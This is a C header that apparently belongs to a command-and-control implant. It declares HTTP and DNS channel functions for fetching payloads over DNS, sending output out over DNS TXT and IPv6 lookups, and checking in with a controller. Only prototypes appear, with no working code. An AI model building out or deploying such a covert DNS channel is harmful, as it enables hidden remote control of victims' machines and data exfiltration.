#ifdef _WIN32
  #define WIN32_LEAN_AND_MEAN
  #define _WINSOCK_DEPRECATED_NO_WARNINGS
  #include <winsock2.h>
  #include <ws2tcpip.h>
  #include <windows.h>
#else
  /* 如果在非 Windows 平台误编译，给出最小兼容定义，避免 VS Code 本机解析报错 */
  #include <sys/types.h>
  #include <sys/socket.h>
  #include <arpa/inet.h>
  #include <netdb.h>
  typedef int SOCKET;              /* Windows 风格别名 */
  #ifndef INVALID_SOCKET
  #define INVALID_SOCKET (-1)
  #endif
#endif

#include "auth_guard.h"

void http_init(char * host, int port, char * ua);
void http_close();
void http_put(char * url, void * buffer, int len, BOOL postNow);
void http_post_maybe(char * url);
int http_get(char * url, void * cookie, char* buffer, int max);

BOOL channel_lookup(char * domain, unsigned int * result);
unsigned int channel_lookup_retry(char * domain, int retry);

u_long channel_localip();
void channel_winsock_init();

/* get payload via DNS */
unsigned int dns_get(char * domain, char * buffer, int max);

/* put output via DNS */
void dns_put(char * type, char * domain, char * buffer, int length);

/* perform a checkin via DNS */
void dns_checkin(char * domain, char * buffer, int length);

/* function prototypes */
int channel_lookup_retry_txt(char * domain, int retry, char * buffer, int max);
unsigned int dns_get_txt(char * domain, char * buffer, int max);
int channel_lookup_retry6(char * domain, int retry, char * buffer);
unsigned int dns_get6(char * domain, char * buffer, int max);
void set_max_dns(unsigned int signal);